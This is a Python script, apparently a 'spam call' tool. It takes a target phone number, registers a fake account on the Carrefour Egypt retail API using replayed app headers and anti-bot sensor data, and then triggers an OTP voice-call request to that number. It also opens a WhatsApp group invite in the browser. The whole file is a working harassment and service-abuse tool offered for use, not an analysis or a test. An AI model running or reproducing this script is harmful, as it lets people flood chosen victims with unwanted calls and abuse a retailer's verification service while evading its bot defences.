import requests
import json
import random
import pyfiglet
import string
red_color = '\033[1;31m'
yellow_color = '\033[1;33m'
green_color = '\033[2;32m'
white_color = '\033[1;97m'
blue_color = '\033[1;34m'
light_blue_color = '\033[2;36m'
light_green_color = '\033[1;32m'
light_yellow_color = '\033[1;33m'
ascii_art = pyfiglet.figlet_format("spam call Unlimited")
print(green_color + ascii_art)
import webbrowser
webbrowser.open('https://chat.whatsapp.com/BDoSFVFNM406IG5cWdzUDR')
print(light_blue_color + "by code: Fast X ")
print(blue_color + "By code: Elgzar")
print("")
number=input("Enter Number:")

em="asdfghjklzxcvnmqwertyuiop1234567890"
for i in range(1):
	lol =(str("".join(random.choice(em)for i in range(7))))
	email="Fox"+lol+"@gmail.com"
	#print(email)
	headers1 = {
    'Host': 'api-prod.retailsso.com',
    'tracestate': '@nr=0-2-3355720-1133908876-----1719511805145',
    'traceparent': '00-f79f2fec868b4b8c9db8a4ce586f0970--00',
    'newrelic': 'eyJ2IjpbMCwyXSwiZCI6eyJkLnR5IjoiTW9iaWxlIiwiZC5hYyI6IjMzNTU3MjAiLCJkLmFwIjoiMTEzMzkwODg3NiIsImQudHIiOiJmNzlmMmZlYzg2OGI0YjhjOWRiOGE0Y2U1ODZmMDk3MCIsImQuaWQiOiI3ZTRiN2JkNTE0MDU0NDM2IiwiZC50aSI6MTcxOTUxMTgwNTE1MX19',
    'appversion': '367',
    'env': 'PROD',
    'langcode': 'en',
    'storeid': 'mafegy',
    'userid': 'anonymous',
    'deviceid': 'caed470fb9033319',
    'appid': 'Android',
    'osversion': '32',
    'country-code': 'EG',
    'user-agent': 'MAFCarrefour/24.6.2(Android 32)',
    'posinfo': 'food=201_Zone03,nonfood=299_Zone09,express=700_Zone01',
    'currency': 'EGP',
    'content-type': 'application/json; charset=UTF-8',
    'content-length': '257',
    'accept-encoding': 'gzip',
    'x-newrelic-id': 'VwUCVFFRCBABVVJRDgEPXlMH'}
    
	data1={"birthday":"",
  "firstName": "Adel",
  "lastName": "Fox",
  "marketingCommunicationAccept":"true",
  "mobileNumber":f"+2{number}",
  "nationality": "",
  "optInLoyalty":"false",
  "password": "QEFkZWxUb3AyMg\u003d\u003d",
  "policyAccept": "y",
  "title": "Mr",
  "username":email}

	response1 = requests.post('https://api-prod.retailsso.com/v3/customers', headers=headers1, json=data1)

	#print(response1.json())

#get accessToken

	res=response1.json()["data"]["accessToken"]
	#print(res)
	access_token="Bearer "+res+""
	#print(access_token)

#request send call

	url2 = "https://api-prod.retailsso.com/v3/customers/otp/voice-call"

	payload = json.dumps({
  "action": "PHONE_VERIFICATION",
  "email":email,
  "locale": "en",
  "mode": "voice",
  "phoneNumber":f"+2{number}",
  "uuid": "9d06356b-4a0b-4548-89f6-570ce2d047ca"
})

	headers2 = {
  'User-Agent': "MAFCarrefour/24.6.2(Android 32)",
  'Accept-Encoding': "gzip",
  'tracestate': "@nr=0-2-3355720-1133908876-----1719516113759",
  'traceparent': "00-cc9d8028111f4a0d953bb6950bd36c51--00",
  'newrelic': "eyJ2IjpbMCwyXSwiZCI6eyJkLnR5IjoiTW9iaWxlIiwiZC5hYyI6IjMzNTU3MjAiLCJkLmFwIjoiMTEzMzkwODg3NiIsImQudHIiOiJjYzlkODAyODExMWY0YTBkOTUzYmI2OTUwYmQzNmM1MSIsImQuaWQiOiI2MTMwZjQ1YmU5NTQ0MzNiIiwiZC50aSI6MTcxOTUxNjExMzc1OX19",
  'appversion': "367",
  'env': "PROD",
  'langcode': "en",
  'storeid': "mafegy",
  'userid':email,
  'deviceid': "caed470fb9033319",
  'appid': "Android",
  'osversion': "32",
  'country-code': "EG",
  'x-acf-sensor-data': "3,a,mFG4feOU57O9aM4xE4vgIairxIzVQTqvJSUJNwnX7xJHYYXtuvn6QoUEEilQvH5uAKSdt6I44gPIG8roWMkUYitu+Tju+r+dQV3RpY7r25KThBjppAikTZJmFO8NufjrTPCrJyOrsvKMh/E66n5Qp1cQd5YTPLHr4Dqnr8lHpAw=,FOKyEpOf50UXxS4VHVwWgkBMVJxXK5Urs9vfoWzGcTaG1UGlMHq2INJYuzGStjNOfbj9A53h56r59jFGNAspHgvvbBKMIvCWxqhNGbTw3MQD9E1JmqbI1lXFZAJJZhJAOd1PR5itGxOfCRpwBtdOaLhNiIPvcE++s5dTTrpIiq4=$VwiHOSwIdPv6NRsqBz49UfU7l78cbRtcOsEFJz5pabC39i9KJHuUbJW+oXJHs8GM14ptPrGYnIVmvSr9k2W16B5EN5Ir52Tn7FXFT7DUBDhJlQ8KEEAdyZQyG7T2qKKGdQYQRasliwxFMykjietIUDBfJs3Unu9ZHbvuSu13ca2iWBLUgJQwgcVIHCUPS6uKmTeFpiSY/3KZQEWW74onqYXV6eHys5and8NW2K7Q2n+OHjagbzEyWKXoykdn4ycUmCRWr77ueZ0U+Dwl7n+dMjGFVNX6Sf5B/EGG5waJg+h+snaUFQG08mC1Mnl9nNs3VcADUYR8GZH/6g+RrXOL/tXFuYb11kzvY6S+QocjmMRCcpUpj1n2w7tGsouRpj1EJnzUjlFRg+TSxh4+LPZL5SW5kIFxvvcJeZqJj4CHABqbQSZCqu4SVvuQ/0W1XW0ow3Cdcx/VNL+1oldENZfZDvNBArK8vCrU8eKI9Rh+s/5mdAVgXtIY/I8ktgrf3zUhZLx3GcFp7LSaftPtvpDEpbUz4TNw8LQp/Q9bBOyriQhxQn6zmOM3nv8jBQouO2RjPkzJSWMBBh9dVf3vc9oEbT011k4QVxtwawrb5LeBsoTCQQp7xwaG8uZtzEbIaCS9O9ERcMXU4/esnpquumpVBe/+hw2eN/V2PH0ORKLjnKtQJJDIFEtdhUvMmgloamGN3z8At8WIggR8TDPvAxlgEFbBYyYXMeUZxFuGjZzHCUIwg0yhlqe69xcBH5fmK5c3nf/13WeiF/7qJ44T6+isIltmh9Pc9qZC2rsEBbXQnena1cNYiyhaLjWdP/BzinvyjnyVGZ7zVw7p/U4MicssexbkETa8UE8Hg3nP8rS/WBk4suoet67osnr6zOrC2+MF02I/NuRVIMmNHc6oGGjX7AQsayuPxqOT5NXcZdGZvfssLxVPaML0L2uQ9aeYtkLqwy13z+Gg/BP9WN4hqGCX4ddvAp7yNyL+OjDQBl2wDIIomX/LK8JndrimyFzMYzMIbM5pdB0Tqe9FVg3KSzBhp1Y7rNYzfyGL+lL8zCqDpQFh1LbaT4H0zhMXFSK1XJh26rO46SYsDEojaCXwpiQiqEf8itn5cBQs3UFdBecai1ftC1TomZNBPHyonFiVYbyupVp/DhJFyKjvD8ffFUTpwg9fRfjpBmeKBXFkThVGszVgJf6Z4CLHc0QpnKEtZJpHd4RxLrF1YbTYwVm9YAZZaO5Wg20EltLDUJ+CxW7A/xeHxcQOSUuGdaDkwP16t2CU8KJU2TyXmqwyRB77qZBaiCWyIKoftPn+ucCPVe/UkATG950cd8OnQdMEUM6oE3LmJfySIKOByK9NaO8FXlZIxyhWQg6KM6B3V1sVHdse8wvyjsnJweRQvIzcig1sDjaLx0/vNrrT28pnWjg7Qjfz96LB3ZoK7kUgdGcvI0IzAhN1xqTpmIJFmzv9IvKr2pjiC4Btn06TpzD2qMxWxB7MMG2l0e5axCgsSIvD+VXSUSoWSqam+F72FbPob7z7TNX5Lbi4Oq63iVu8KY8pH8CS5YlUrbFxu17NGMt8T0Hl4JhUcOxid/+t0LKDWhdJPGGzFmHa/yQVvLPvAoIiaTxWQHq3hm7Mpq8HoX+AboEpCkP3oY1KIKaKT1xMO34rREwq7CfNWmOfIMGOQ6VfadBmIZDubZwEnvdeVtFWS/Tlgct0JsXEyQKe7MsXJqyu7ai6t0AitmA0LZz7S9PbfZ9+Yfzo4DpBYuoUgGRRyznOb0LoWrtQc1dCSoQZ1pXeLJkCopw3sVtp74MHBlj1E1pvCpf9ttUaRJAw8hIVfi4uGJo=$81,40,71$$$AAQAAAAB%2f%2f%2f%2f%2f8tcThCDK1eGElX39O3p+7Vx2hKd0HBTcvnLdjpdwXkFq1Ep7tTL%2fRlzaVMD4lqOWqeDaHCtTnQBcSloO5Z5qyxAIuiPFkIN+b9zUo8FJ%2faVKlPY8AypyW+hByiC4mGYcdoFD3qDToDm6%2f5wl6zJWcS8AS5zFCVPemKCgSXxvK85Qo6O4kSQtr01xFE6CMXav2WR6jAtN6BsFuo%3d",
  'posinfo': "food=201_Zone03,nonfood=299_Zone09,express=700_Zone01",
  'currency': "EGP",
  'token':access_token,
  'content-type': "application/json; charset=UTF-8",
  'x-newrelic-id': "VwUCVFFRCBABVVJRDgEPXlMH"}

	response2 = requests.post(url2,data=payload, headers=headers2)

	print(response2.text)
